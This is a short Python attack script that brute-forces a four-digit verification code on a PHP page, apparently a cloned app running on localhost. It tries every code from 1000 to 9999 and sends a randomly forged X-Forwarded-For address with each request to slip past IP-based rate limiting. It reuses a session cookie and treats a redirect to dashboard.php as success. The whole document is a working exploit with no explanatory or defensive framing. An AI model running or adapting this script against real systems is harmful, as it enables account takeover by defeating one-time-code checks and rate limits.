import requests
import random
from time import sleep

URL = "http://localhost/hmr_clone/verify_code.php"

session_cookie = {
    "PHPSESSID": "place-PHPSESSID"
}

def generate_spoofed_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def brute_force_code():
    for code in range(1000, 10000):
        spoofed_ip = generate_spoofed_ip()
        headers = {
            "X-Forwarded-For": spoofed_ip,
            "User-Agent": "Mozilla/5.0"
        }

        payload = {
            "code": f"{code:04d}"
        }

        response = requests.post(
            URL,
            data=payload,
            headers=headers,
            cookies=session_cookie,
            allow_redirects=False
        )

        print(f"[{spoofed_ip}] Trying code: {code:04d} => Status: {response.status_code}")

        if response.status_code == 302 and "dashboard.php" in response.headers.get("Location", ""):
            print(f"[+] Code found: {code:04d}")
            break

if __name__ == "__main__":
    brute_force_code()
